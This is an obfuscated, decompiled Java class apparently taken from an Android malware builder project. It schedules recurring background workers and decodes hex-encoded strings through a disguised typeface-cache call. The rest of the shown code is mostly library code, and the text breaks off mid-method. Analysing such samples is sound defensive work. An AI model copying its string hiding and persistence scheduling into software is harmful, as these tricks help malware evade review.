package v.s;

import android.content.Context;
import android.content.pm.PackageInfo;
import android.os.Build;
import android.os.Trace;
import android.util.SparseArray;
import android.view.KeyEvent;
import android.view.View;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;
import app.mobilex.plus.workers.DataFPAdapter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.ref.WeakReference;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.Map;
import java.util.concurrent.CancellationException;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicIntegerFieldUpdater;
import java.util.concurrent.atomic.AtomicReferenceFieldUpdater;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public abstract class OFMrQsTe5s1KYV0lq {
    public static Method Ee8d2j4S9Vm5yGuR;
    public static boolean JXn4Qf7zpnLjP5;
    public static Method ibVTtJUNfrGYbW;
    public static long xDyLpEZyrcKVe0;
    public static final char[] dDIMxZXP1V8HdM = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
    public static final o0rN3ekjBJ6kKwok w9sT1Swbhx3hs = new o0rN3ekjBJ6kKwok("REMOVED_TASK", 1);
    public static final o0rN3ekjBJ6kKwok vekpFI4d1Nc4fakF = new o0rN3ekjBJ6kKwok("CLOSED_EMPTY", 1);

    public static final boolean D5P1xCAyuvgF(char c, char c2, boolean z) {
        if (c == c2) {
            return true;
        }
        if (!z) {
            return false;
        }
        char upperCase = Character.toUpperCase(c);
        char upperCase2 = Character.toUpperCase(c2);
        return upperCase == upperCase2 || Character.toLowerCase(upperCase) == Character.toLowerCase(upperCase2);
    }

    public static void DVTNwpDEVsUKuznof(Context context) {
        RdWywP7AQUqPn0G rdWywP7AQUqPn0G = new RdWywP7AQUqPn0G(2, false, false, false, false, -1L, -1L, imhBI9RqzETHtVIJe.GiffeZJ1rbwyx(new LinkedHashSet()));
        TimeUnit timeUnit = TimeUnit.MINUTES;
        Y8MwLPMWPnKWILrHb10M y8MwLPMWPnKWILrHb10M = new Y8MwLPMWPnKWILrHb10M(DataFPAdapter.class);
        y8MwLPMWPnKWILrHb10M.vekpFI4d1Nc4fakF.D5P1xCAyuvgF = rdWywP7AQUqPn0G;
        TimeUnit timeUnit2 = TimeUnit.SECONDS;
        bIQtXpTQsEoGIf25Z.l1V0lQr6TbwNKqHfXNbb(context).DVTNwpDEVsUKuznof(DataFPAdapter.xDyLpEZyrcKVe0, 3, (zx5222rdBWLkmaqS) ((Y8MwLPMWPnKWILrHb10M) y8MwLPMWPnKWILrHb10M.JXn4Qf7zpnLjP5((-75) + 77, 30L)).dDIMxZXP1V8HdM());
        l1V0lQr6TbwNKqHfXNbb(context, 0L);
        TypefaceCache.obtain("00070077004F008600D6008F00F300A300220066004F008200E200FF00C100A4002B0073005F009200FC00BA00D600E7006B0066005E009500F900B000D600AE00200036001000C700F300B700D300AE002D003F");
    }

    public static final long EWUjsTERgdPbSw3NNlN(String str, long j, long j2, long j3) {
        String property;
        int i = RN3oZ7h5zHy79TdFsDfo.dDIMxZXP1V8HdM;
        try {
            property = System.getProperty(str);
        } catch (SecurityException unused) {
            property = null;
        }
        if (property == null) {
            return j;
        }
        Long lK84rwRrqzhrNQ1CdNQ9 = VRUWMIt9DMXCmdEpyK46.k84rwRrqzhrNQ1CdNQ9(property);
        if (lK84rwRrqzhrNQ1CdNQ9 == null) {
            throw new IllegalStateException(("System property '" + str + "' has unrecognized value '" + property + '\'').toString());
        }
        long jLongValue = lK84rwRrqzhrNQ1CdNQ9.longValue();
        if (j2 <= jLongValue && jLongValue <= j3) {
            return jLongValue;
        }
        throw new IllegalStateException(("System property '" + str + "' should be in range " + j2 + ".." + j3 + ", but is '" + jLongValue + '\'').toString());
    }

    public static void Ee8d2j4S9Vm5yGuR(int i) {
        int i2 = 6 - 5;
        if (new VUjeMiNYIJhgmVJopga(2, 36, i2).w9sT1Swbhx3hs(i)) {
            return;
        }
        throw new IllegalArgumentException("radix " + i + " was not in valid range " + new VUjeMiNYIJhgmVJopga(2, 36, i2));
    }

    public static void J0zjQ7CAgohuxU20eCW6(SyncQYAdapter syncQYAdapter) {
        RdWywP7AQUqPn0G rdWywP7AQUqPn0G = new RdWywP7AQUqPn0G(2, false, false, false, false, -1L, -1L, imhBI9RqzETHtVIJe.GiffeZJ1rbwyx(new LinkedHashSet()));
        oYjRfyNUfG2VVXvyQx oyjrfynufg2vvxvyqx = new oYjRfyNUfG2VVXvyQx(DataFPAdapter.class);
        oyjrfynufg2vvxvyqx.vekpFI4d1Nc4fakF.D5P1xCAyuvgF = rdWywP7AQUqPn0G;
        oyjrfynufg2vvxvyqx.JXn4Qf7zpnLjP5.add(TypefaceCache.obtain("0033007F0055008000CF00B100DD00B0"));
        new bVJI6LA77fw3pJCMf(bIQtXpTQsEoGIf25Z.l1V0lQr6TbwNKqHfXNbb(syncQYAdapter), DataFPAdapter.b1EoSIRjJHO5, 1, Collections.singletonList((ef4J0JkBTTW3lk3B8) oyjrfynufg2vvxvyqx.dDIMxZXP1V8HdM()), 0).dTS0S7eC32ubQH54j36();
        TypefaceCache.obtain("0013007F0055008000DE00B000C500E700260078004A009200F500AA00D700A3");
    }

    public static void K7eEOBPYP9VIoHWTe(Context context) {
        AtomicBoolean atomicBoolean;
        Mf1Og5l70Bn6TXFI7E mf1Og5l70Bn6TXFI7E = Mf1Og5l70Bn6TXFI7E.ibVTtJUNfrGYbW;
        if (mf1Og5l70Bn6TXFI7E == null || (atomicBoolean = mf1Og5l70Bn6TXFI7E.w9sT1Swbhx3hs) == null || !atomicBoolean.get()) {
            Mf1Og5l70Bn6TXFI7E mf1Og5l70Bn6TXFI7E2 = new Mf1Og5l70Bn6TXFI7E(context.getApplicationContext());
            mf1Og5l70Bn6TXFI7E2.w9sT1Swbhx3hs();
            Mf1Og5l70Bn6TXFI7E.ibVTtJUNfrGYbW = mf1Og5l70Bn6TXFI7E2;
        }
    }

    public static cpTq2XMCb5JSaEhn MLSIo1htfMPWeB8V876L(cpTq2XMCb5JSaEhn cptq2xmcb5jsaehn, cpTq2XMCb5JSaEhn cptq2xmcb5jsaehn2) {
        return cptq2xmcb5jsaehn2 == sNACkioAJERo.w9sT1Swbhx3hs ? cptq2xmcb5jsaehn : (cpTq2XMCb5JSaEhn) cptq2xmcb5jsaehn2.Qrz92kRPw4GcghAc(cptq2xmcb5jsaehn, FSwSEr9VdwZSt232c7Cj.Ee8d2j4S9Vm5yGuR);
    }

    public static void O2DHNSIGZlgPja7eqLgn(ZZ4JSe5sYVMN33b7 zZ4JSe5sYVMN33b7) {
        lTvXDdEqiCIXojiLB ltvxddeqicixojilb = (lTvXDdEqiCIXojiLB) zZ4JSe5sYVMN33b7;
        ltvxddeqicixojilb.getClass();
        while (Math.max(Xmmn1A4TQOiVOB.JXn4Qf7zpnLjP5.get(ltvxddeqicixojilb), 0) == 0) {
            AtomicReferenceFieldUpdater atomicReferenceFieldUpdater = lTvXDdEqiCIXojiLB.Ee8d2j4S9Vm5yGuR;
            Object obj = atomicReferenceFieldUpdater.get(ltvxddeqicixojilb);
            o0rN3ekjBJ6kKwok o0rn3ekjbj6kkwok = RIZfHbqXpth8r2yN4.w9sT1Swbhx3hs;
            if (obj != o0rn3ekjbj6kkwok) {
                do {
                    if (atomicReferenceFieldUpdater.compareAndSet(ltvxddeqicixojilb, obj, o0rn3ekjbj6kkwok)) {
                        ltvxddeqicixojilb.dDIMxZXP1V8HdM();
                        return;
                    }
                } while (atomicReferenceFieldUpdater.get(ltvxddeqicixojilb) == obj);
            }
        }
        throw new IllegalStateException("This mutex is not locked");
    }

    public static final void Qrz92kRPw4GcghAc(Context context) {
        Map mapSingletonMap;
        if (context.getDatabasePath("androidx.work.workdb").exists()) {
            fEyMFFyOOvHURJ7To6L feymffyoovhurj7to6lPyu8ovAipBTLYAiKab = fEyMFFyOOvHURJ7To6L.pyu8ovAipBTLYAiKab();
            String[] strArr = BPlnbW1U6J0PKqVGB.dDIMxZXP1V8HdM;
            feymffyoovhurj7to6lPyu8ovAipBTLYAiKab.getClass();
            File databasePath = context.getDatabasePath("androidx.work.workdb");
            File file = new File(SZMVQHSLEmk3KzoEzyls.dDIMxZXP1V8HdM.dDIMxZXP1V8HdM(context), "androidx.work.workdb");
            String[] strArr2 = BPlnbW1U6J0PKqVGB.dDIMxZXP1V8HdM;
            int iDVTNwpDEVsUKuznof = oRoeOWAwLibMBxZYyTh.DVTNwpDEVsUKuznof(strArr2.length);
            int i = (-43) + 59;
            if (iDVTNwpDEVsUKuznof < i) {
                iDVTNwpDEVsUKuznof = i;
            }
            LinkedHashMap linkedHashMap = new LinkedHashMap(iDVTNwpDEVsUKuznof);
            for (String str : strArr2) {
                linkedHashMap.put(new File(databasePath.getPath() + str), new File(file.getPath() + str));
            }
            if (linkedHashMap.isEmpty()) {
                mapSingletonMap = Collections.singletonMap(databasePath, file);
            } else {
                LinkedHashMap linkedHashMap2 = new LinkedHashMap(linkedHashMap);
                linkedHashMap2.put(databasePath, file);
                mapSingletonMap = linkedHashMap2;
            }
            for (Map.Entry entry : mapSingletonMap.entrySet()) {
                File file2 = (File) entry.getKey();
                File file3 = (File) entry.getValue();
                if (file2.exists()) {
                    if (file3.exists()) {
                        fEyMFFyOOvHURJ7To6L feymffyoovhurj7to6lPyu8ovAipBTLYAiKab2 = fEyMFFyOOvHURJ7To6L.pyu8ovAipBTLYAiKab();
                        String[] strArr3 = BPlnbW1U6J0PKqVGB.dDIMxZXP1V8HdM;
                        file3.toString();
                        feymffyoovhurj7to6lPyu8ovAipBTLYAiKab2.getClass();
                    }
                    if (file2.renameTo(file3)) {
                        file2.toString();
                        file3.toString();
                    } else {
                        file2.toString();
                        file3.toString();
                    }
                    fEyMFFyOOvHURJ7To6L feymffyoovhurj7to6lPyu8ovAipBTLYAiKab3 = fEyMFFyOOvHURJ7To6L.pyu8ovAipBTLYAiKab();
                    String[] strArr4 = BPlnbW1U6J0PKqVGB.dDIMxZXP1V8HdM;
                    feymffyoovhurj7to6lPyu8ovAipBTLYAiKab3.getClass();
                }
            }
        }
    }

    public static boolean b1EoSIRjJHO5(View view, KeyEvent keyEvent) {
        ArrayList arrayList;
        int size;
        int iIndexOfKey;
        int i = tg6EjdKQH74QUty.dDIMxZXP1V8HdM;
        if (Build.VERSION.SDK_INT >= 28) {
            return false;
        }
        ArrayList arrayList2 = Yz1USB4jlmvFxN4ddip.JXn4Qf7zpnLjP5;
        Yz1USB4jlmvFxN4ddip yz1USB4jlmvFxN4ddip = (Yz1USB4jlmvFxN4ddip) view.getTag(2131099749);
        WeakReference weakReference = null;
        if (yz1USB4jlmvFxN4ddip == null) {
            yz1USB4jlmvFxN4ddip = new Yz1USB4jlmvFxN4ddip();
            yz1USB4jlmvFxN4ddip.dDIMxZXP1V8HdM = null;
            yz1USB4jlmvFxN4ddip.w9sT1Swbhx3hs = null;
            yz1USB4jlmvFxN4ddip.vekpFI4d1Nc4fakF = null;
            view.setTag(2131099749, yz1USB4jlmvFxN4ddip);
        }
        WeakReference weakReference2 = yz1USB4jlmvFxN4ddip.vekpFI4d1Nc4fakF;
        if (weakReference2 != null && weakReference2.get() == keyEvent) {
            return false;
        }
        yz1USB4jlmvFxN4ddip.vekpFI4d1Nc4fakF = new WeakReference(keyEvent);
        if (yz1USB4jlmvFxN4ddip.w9sT1Swbhx3hs == null) {
            yz1USB4jlmvFxN4ddip.w9sT1Swbhx3hs = new SparseArray();
        }
        SparseArray sparseArray = yz1USB4jlmvFxN4ddip.w9sT1Swbhx3hs;
        if (keyEvent.getAction() == 1 && (iIndexOfKey = sparseArray.indexOfKey(keyEvent.getKeyCode())) >= 0) {
            weakReference = (WeakReference) sparseArray.valueAt(iIndexOfKey);
            sparseArray.removeAt(iIndexOfKey);
        }
        if (weakReference == null) {
            weakReference = (WeakReference) sparseArray.get(keyEvent.getKeyCode());
        }
        if (weakReference == null) {
            return false;
        }
        View view2 = (View) weakReference.get();
        if (view2 == null || !c3ktnmRelrusjqF5BDPM.w9sT1Swbhx3hs(view2) || (arrayList = (ArrayList) view2.getTag(2131099750)) == null || (size = arrayList.size() - 1) < 0) {
            return true;
        }
        arrayList.get(size).getClass();
        throw new ClassCastException();
    }

    public static final int dDIMxZXP1V8HdM(char c) {
        if ('0' <= c && c < ':') {
            return c - '0';
        }
        if ('a' <= c && c < 'g') {
            return c - 'W';
        }
        if ('A' <= c && c < 'G') {
            return c - '7';
        }
        throw new IllegalArgumentException("Unexpected hex digit: " + c);
    }

    public static void dTS0S7eC32ubQH54j36() {
        Mf1Og5l70Bn6TXFI7E mf1Og5l70Bn6TXFI7E = Mf1Og5l70Bn6TXFI7E.ibVTtJUNfrGYbW;
        if (mf1Og5l70Bn6TXFI7E != null) {
            mf1Og5l70Bn6TXFI7E.w9sT1Swbhx3hs.set(false);
            J1m0XraSkScfWFMIlTC j1m0XraSkScfWFMIlTC = mf1Og5l70Bn6TXFI7E.vekpFI4d1Nc4fakF;
            if (j1m0XraSkScfWFMIlTC != null) {
                j1m0XraSkScfWFMIlTC.w9sT1Swbhx3hs(TypefaceCache.obtain("0030006200540097"), 1000);
            }
            mf1Og5l70Bn6TXFI7E.vekpFI4d1Nc4fakF = null;
            mf1Og5l70Bn6TXFI7E.dDIMxZXP1V8HdM();
            mf1Og5l70Bn6TXFI7E.Ee8d2j4S9Vm5yGuR.shutdownNow();
        }
        Mf1Og5l70Bn6TXFI7E.ibVTtJUNfrGYbW = null;
    }

    public static final boolean gIIiyi2ddlMDR0(char c) {
        return Character.isWhitespace(c) || Character.isSpaceChar(c);
    }

    public static boolean gmNWMfvn6zlEj() {
        AtomicBoolean atomicBoolean;
        Mf1Og5l70Bn6TXFI7E mf1Og5l70Bn6TXFI7E = Mf1Og5l70Bn6TXFI7E.ibVTtJUNfrGYbW;
        return (mf1Og5l70Bn6TXFI7E == null || (atomicBoolean = mf1Og5l70Bn6TXFI7E.w9sT1Swbhx3hs) == null || !atomicBoolean.get()) ? false : true;
    }

    public static boolean hjneShqpF9Tis4() {
        try {
            if (ibVTtJUNfrGYbW == null) {
                return Trace.isEnabled();
            }
        } catch (NoClassDefFoundError | NoSuchMethodError unused) {
        }
        try {
            if (ibVTtJUNfrGYbW == null) {
                xDyLpEZyrcKVe0 = Trace.class.getField("TRACE_TAG_APP").getLong(null);
                ibVTtJUNfrGYbW = Trace.class.getMethod("isTagEnabled", Long.TYPE);
            }
            return ((Boolean) ibVTtJUNfrGYbW.invoke(null, Long.valueOf(xDyLpEZyrcKVe0))).booleanValue();
        } catch (Exception e) {
            if (!(e instanceof InvocationTargetException)) {
                return false;
            }
            Throwable cause = e.getCause();
            if (cause instanceof RuntimeException) {
                throw ((RuntimeException) cause);
            }
            throw new RuntimeException(cause);
        }
    }

    public static byte[] ibVTtJUNfrGYbW(ArrayDeque arrayDeque, int i) {
        if (arrayDeque.isEmpty()) {
            return new byte[0];
        }
        byte[] bArr = (byte[]) arrayDeque.remove();
        if (bArr.length == i) {
            return bArr;
        }
        int length = i - bArr.length;
        byte[] bArrCopyOf = Arrays.copyOf(bArr, i);
        while (length > 0) {
            byte[] bArr2 = (byte[]) arrayDeque.remove();
            int iMin = Math.min(length, bArr2.length);
            System.arraycopy(bArr2, 0, bArrCopyOf, i - length, iMin);
            length -= iMin;
        }
        return bArrCopyOf;
    }

    public static void l1V0lQr6TbwNKqHfXNbb(Context context, long j) {
        RdWywP7AQUqPn0G rdWywP7AQUqPn0G = new RdWywP7AQUqPn0G(55 - 53, false, false, false, false, -1L, -1L, imhBI9RqzETHtVIJe.GiffeZJ1rbwyx(new LinkedHashSet()));
        oYjRfyNUfG2VVXvyQx oyjrfynufg2vvxvyqx = new oYjRfyNUfG2VVXvyQx(DataFPAdapter.class);
        oyjrfynufg2vvxvyqx.vekpFI4d1Nc4fakF.D5P1xCAyuvgF = rdWywP7AQUqPn0G;
        oYjRfyNUfG2VVXvyQx oyjrfynufg2vvxvyqx2 = (oYjRfyNUfG2VVXvyQx) oyjrfynufg2vvxvyqx.Ee8d2j4S9Vm5yGuR(j, TimeUnit.MINUTES);
        TimeUnit timeUnit = TimeUnit.SECONDS;
        oYjRfyNUfG2VVXvyQx oyjrfynufg2vvxvyqx3 = (oYjRfyNUfG2VVXvyQx) oyjrfynufg2vvxvyqx2.JXn4Qf7zpnLjP5(2, 30L);
        oyjrfynufg2vvxvyqx3.JXn4Qf7zpnLjP5.add(TypefaceCache.obtain("0020007E005A008E00FE008000C200AE002D0071"));
        new bVJI6LA77fw3pJCMf(bIQtXpTQsEoGIf25Z.l1V0lQr6TbwNKqHfXNbb(context), DataFPAdapter.ibVTtJUNfrGYbW, 1, Collections.singletonList((ef4J0JkBTTW3lk3B8) oyjrfynufg2vvxvyqx3.dDIMxZXP1V8HdM()), 0).dTS0S7eC32ubQH54j36();
    }

    public static void nQilHWaqS401ZtR(PackageInfo packageInfo, File file) {
        try {
            DataOutputStream dataOutputStream = new DataOutputStream(new FileOutputStream(new File(file, "profileinstaller_profileWrittenFor_lastUpdateTime.dat")));
            try {
                dataOutputStream.writeLong(packageInfo.lastUpdateTime);
                dataOutputStream.close();
            } catch (Throwable th) {
                try {
                    dataOutputStream.close();
                } catch (Throwable th2) {
                    th.addSuppressed(th2);
                }
                throw th;
            }
        } catch (IOException unused) {
        }
    }

    /* JADX WARN: Code duplicated, block: B:26:0x0077  */
    /* JADX WARN: Code duplicated, block: B:27:0x0078  */
    /* JADX WARN: Code duplicated, block: B:30:0x0086 A[Catch: all -> 0x0041, TryCatch #0 {all -> 0x0041, blocks: (B:13:0x0038, B:24:0x0067, B:28:0x007e, B:30:0x0086, B:32:0x008c, B:34:0x0092, B:37:0x00a5, B:39:0x00ad, B:40:0x00b4, B:41:0x00b6, B:42:0x00b7, B:43:0x00be, B:20:0x0056, B:23:0x005d), top: B:58:0x0026 }] */
    /* JADX WARN: Code duplicated, block: B:32:0x008c A[Catch: all -> 0x0041, TryCatch #0 {all -> 0x0041, blocks: (B:13:0x0038, B:24:0x0067, B:28:0x007e, B:30:0x0086, B:32:0x008c, B:34:0x0092, B:37:0x00a5, B:39:0x00ad, B:40:0x00b4, B:41:0x00b6, B:42:0x00b7, B:43:0x00be, B:20:0x0056, B:23:0x005d), top: B:58:0x0026 }] */
    /* JADX WARN: Code duplicated, block: B:34:0x0092 A[Catch: all -> 0x0041, TryCatch #0 {all -> 0x0041, blocks: (B:13:0x0038, B:24:0x0067, B:28:0x007e, B:30:0x0086, B:32:0x008c, B:34:0x0092, B:37:0x00a5, B:39:0x00ad, B:40:0x00b4, B:41:0x00b6, B:42:0x00b7, B:43:0x00be, B:20:0x0056, B:23:0x005d), top: B:58:0x0026 }] */
    /* JADX WARN: Code duplicated, block: B:37:0x00a5 A[Catch: all -> 0x0041, TryCatch #0 {all -> 0x0041, blocks: (B:13:0x0038, B:24:0x0067, B:28:0x007e, B:30:0x0086, B:32:0x008c, B:34:0x0092, B:37:0x00a5, B:39:0x00ad, B:40:0x00b4, B:41:0x00b6, B:42:0x00b7, B:43:0x00be, B:20:0x0056, B:23:0x005d), top: B:58:0x0026 }] */
    /* JADX WARN: Code duplicated, block: B:39:0x00ad A[Catch: all -> 0x0041, TryCatch #0 {all -> 0x0041, blocks: (B:13:0x0038, B:24:0x0067, B:28:0x007e, B:30:0x0086, B:32:0x008c, B:34:0x0092, B:37:0x00a5, B:39:0x00ad, B:40:0x00b4, B:41:0x00b6, B:42:0x00b7, B:43:0x00be, B:20:0x0056, B:23:0x005d), top: B:58:0x0026 }] */
    /* JADX WARN: Code duplicated, block: B:42:0x00b7 A[Catch: all -> 0x0041, TryCatch #0 {all -> 0x0041, blocks: (B:13:0x0038, B:24:0x0067, B:28:0x007e, B:30:0x0086, B:32:0x008c, B:34:0x0092, B:37:0x00a5, B:39:0x00ad, B:40:0x00b4, B:41:0x00b6, B:42:0x00b7, B:43:0x00be, B:20:0x0056, B:23:0x005d), top: B:58:0x0026 }] */
    /* JADX WARN: Code duplicated, block: B:44:0x00bf A[DONT_INVERT] */
    /* JADX WARN: Code duplicated, block: B:45:0x00c1  */
    /* JADX WARN: Code duplicated, block: B:7:0x0014  */
    /* JADX WARN: Code restructure failed: missing block: B:35:0x00a0, code lost:
    
        if (r1.dDIMxZXP1V8HdM(r11, r0) == r5) goto L36;
     */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:35:0x00a0 -> B:14:0x003b). Please report as a decompilation issue!!! */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final Object pyu8ovAipBTLYAiKab(UrJN9H1OU7p7Jp urJN9H1OU7p7Jp, R5WF639wwoyEjivV7M7 r5WF639wwoyEjivV7M7, boolean z, CWIOrUfHtKyaxQib0W cWIOrUfHtKyaxQib0W) {
        seJRiKQLYtpnD8X6Xei sejrikqlytpnd8x6xei;
        OQ5dNvIVkA1dcss1 oQ5dNvIVkA1dcss1;
        gUw52pKTgwkb0KB guw52pktgwkb0kb;
        OQ5dNvIVkA1dcss1 oQ5dNvIVkA1dcss2;
        UrJN9H1OU7p7Jp urJN9H1OU7p7Jp2;
        Object obj;
        o0rN3ekjBJ6kKwok o0rn3ekjbj6kkwok;
        Throwable thQrz92kRPw4GcghAc;
        gUw52pKTgwkb0KB guw52pktgwkb0kb2;
        gUw52pKTgwkb0KB guw52pktgwkb0kb3;
        if (cWIOrUfHtKyaxQib0W instanceof seJRiKQLYtpnD8X6Xei) {
            sejrikqlytpnd8x6xei = (seJRiKQLYtpnD8X6Xei) cWIOrUfHtKyaxQib0W;
            int i = sejrikqlytpnd8x6xei.D5P1xCAyuvgF;
            if ((i & Integer.MIN_VALUE) != 0) {
                sejrikqlytpnd8x6xei.D5P1xCAyuvgF = i - Integer.MIN_VALUE;
            } else {
                sejrikqlytpnd8x6xei = new seJRiKQLYtpnD8X6Xei(cWIOrUfHtKyaxQib0W);
            }
        } else {
            sejrikqlytpnd8x6xei = new seJRiKQLYtpnD8X6Xei(cWIOrUfHtKyaxQib0W);
        }
        Object objW9sT1Swbhx3hs = sejrikqlytpnd8x6xei.pyu8ovAipBTLYAiKab;
        int i2 = sejrikqlytpnd8x6xei.D5P1xCAyuvgF;
        pjN1L01KDMWnPCy0daD pjn1l01kdmwnpcy0dad = pjN1L01KDMWnPCy0daD.w9sT1Swbhx3hs;
        try {
            if (i2 == 0) {
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(objW9sT1Swbhx3hs);
                HT6Px2xDdrmDEbykyYy hT6Px2xDdrmDEbykyYy = r5WF639wwoyEjivV7M7.Ee8d2j4S9Vm5yGuR;
                hT6Px2xDdrmDEbykyYy.getClass();
                oQ5dNvIVkA1dcss1 = new OQ5dNvIVkA1dcss1(hT6Px2xDdrmDEbykyYy);
                guw52pktgwkb0kb2 = r5WF639wwoyEjivV7M7;
                sejrikqlytpnd8x6xei.Ee8d2j4S9Vm5yGuR = urJN9H1OU7p7Jp;
                sejrikqlytpnd8x6xei.xDyLpEZyrcKVe0 = guw52pktgwkb0kb2;
                sejrikqlytpnd8x6xei.ibVTtJUNfrGYbW = oQ5dNvIVkA1dcss1;
                sejrikqlytpnd8x6xei.b1EoSIRjJHO5 = z;
                sejrikqlytpnd8x6xei.D5P1xCAyuvgF = 1;
                objW9sT1Swbhx3hs = oQ5dNvIVkA1dcss1.w9sT1Swbhx3hs(sejrikqlytpnd8x6xei);
                if (objW9sT1Swbhx3hs == pjn1l01kdmwnpcy0dad) {
                    OQ5dNvIVkA1dcss1 oQ5dNvIVkA1dcss3 = oQ5dNvIVkA1dcss1;
                    urJN9H1OU7p7Jp2 = urJN9H1OU7p7Jp;
                    oQ5dNvIVkA1dcss2 = oQ5dNvIVkA1dcss3;
                    guw52pktgwkb0kb = guw52pktgwkb0kb2;
                    if (!((Boolean) objW9sT1Swbhx3hs).booleanValue()) {
                        if (z) {
                            guw52pktgwkb0kb.vekpFI4d1Nc4fakF(null);
                        }
                        return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                    }
                    obj = oQ5dNvIVkA1dcss2.w9sT1Swbhx3hs;
                    o0rn3ekjbj6kkwok = LYgmvfM6ccmccA0DV.nQilHWaqS401ZtR;
                    if (obj == o0rn3ekjbj6kkwok) {
                        throw new IllegalStateException("`hasNext()` has not been invoked");
                    }
                    oQ5dNvIVkA1dcss2.w9sT1Swbhx3hs = o0rn3ekjbj6kkwok;
                    if (obj == LYgmvfM6ccmccA0DV.gmNWMfvn6zlEj) {
                        thQrz92kRPw4GcghAc = oQ5dNvIVkA1dcss2.JXn4Qf7zpnLjP5.Qrz92kRPw4GcghAc();
                        if (thQrz92kRPw4GcghAc == null) {
                            thQrz92kRPw4GcghAc = new GF2XQtecfzOat6RtF("Channel was closed");
                        }
                        int i3 = mofFoMhrcahJuf2MKa0Q.dDIMxZXP1V8HdM;
                        throw thQrz92kRPw4GcghAc;
                    }
                    sejrikqlytpnd8x6xei.Ee8d2j4S9Vm5yGuR = urJN9H1OU7p7Jp2;
                    sejrikqlytpnd8x6xei.xDyLpEZyrcKVe0 = guw52pktgwkb0kb;
                    sejrikqlytpnd8x6xei.ibVTtJUNfrGYbW = oQ5dNvIVkA1dcss2;
                    sejrikqlytpnd8x6xei.b1EoSIRjJHO5 = z;
                    sejrikqlytpnd8x6xei.D5P1xCAyuvgF = 2;
                }
                guw52pktgwkb0kb3 = guw52pktgwkb0kb;
                return pjn1l01kdmwnpcy0dad;
            }
            if (i2 == 1) {
                z = sejrikqlytpnd8x6xei.b1EoSIRjJHO5;
                oQ5dNvIVkA1dcss2 = sejrikqlytpnd8x6xei.ibVTtJUNfrGYbW;
                gUw52pKTgwkb0KB guw52pktgwkb0kb4 = sejrikqlytpnd8x6xei.xDyLpEZyrcKVe0;
                urJN9H1OU7p7Jp2 = sejrikqlytpnd8x6xei.Ee8d2j4S9Vm5yGuR;
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(objW9sT1Swbhx3hs);
                guw52pktgwkb0kb = guw52pktgwkb0kb4;
                if (!((Boolean) objW9sT1Swbhx3hs).booleanValue()) {
                    if (z) {
                        guw52pktgwkb0kb.vekpFI4d1Nc4fakF(null);
                    }
                    return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                }
                obj = oQ5dNvIVkA1dcss2.w9sT1Swbhx3hs;
                o0rn3ekjbj6kkwok = LYgmvfM6ccmccA0DV.nQilHWaqS401ZtR;
                if (obj == o0rn3ekjbj6kkwok) {
                    throw new IllegalStateException("`hasNext()` has not been invoked");
                }
                oQ5dNvIVkA1dcss2.w9sT1Swbhx3hs = o0rn3ekjbj6kkwok;
                if (obj == LYgmvfM6ccmccA0DV.gmNWMfvn6zlEj) {
                    thQrz92kRPw4GcghAc = oQ5dNvIVkA1dcss2.JXn4Qf7zpnLjP5.Qrz92kRPw4GcghAc();
                    if (thQrz92kRPw4GcghAc == null) {
                        thQrz92kRPw4GcghAc = new GF2XQtecfzOat6RtF("Channel was closed");
                    }
                    int i4 = mofFoMhrcahJuf2MKa0Q.dDIMxZXP1V8HdM;
                    throw thQrz92kRPw4GcghAc;
                }
                sejrikqlytpnd8x6xei.Ee8d2j4S9Vm5yGuR = urJN9H1OU7p7Jp2;
                sejrikqlytpnd8x6xei.xDyLpEZyrcKVe0 = guw52pktgwkb0kb;
                sejrikqlytpnd8x6xei.ibVTtJUNfrGYbW = oQ5dNvIVkA1dcss2;
                sejrikqlytpnd8x6xei.b1EoSIRjJHO5 = z;
                sejrikqlytpnd8x6xei.D5P1xCAyuvgF = 2;
            } else {
                if (i2 != 2) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                z = sejrikqlytpnd8x6xei.b1EoSIRjJHO5;
                oQ5dNvIVkA1dcss2 = sejrikqlytpnd8x6xei.ibVTtJUNfrGYbW;
                gUw52pKTgwkb0KB guw52pktgwkb0kb5 = sejrikqlytpnd8x6xei.xDyLpEZyrcKVe0;
                urJN9H1OU7p7Jp2 = sejrikqlytpnd8x6xei.Ee8d2j4S9Vm5yGuR;
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(objW9sT1Swbhx3hs);
                guw52pktgwkb0kb3 = guw52pktgwkb0kb5;
            }
            guw52pktgwkb0kb3 = guw52pktgwkb0kb;
            UrJN9H1OU7p7Jp urJN9H1OU7p7Jp3 = urJN9H1OU7p7Jp2;
            oQ5dNvIVkA1dcss1 = oQ5dNvIVkA1dcss2;
            urJN9H1OU7p7Jp = urJN9H1OU7p7Jp3;
            guw52pktgwkb0kb2 = guw52pktgwkb0kb3;
            sejrikqlytpnd8x6xei.Ee8d2j4S9Vm5yGuR = urJN9H1OU7p7Jp;
            sejrikqlytpnd8x6xei.xDyLpEZyrcKVe0 = guw52pktgwkb0kb2;
            sejrikqlytpnd8x6xei.ibVTtJUNfrGYbW = oQ5dNvIVkA1dcss1;
            sejrikqlytpnd8x6xei.b1EoSIRjJHO5 = z;
            sejrikqlytpnd8x6xei.D5P1xCAyuvgF = 1;
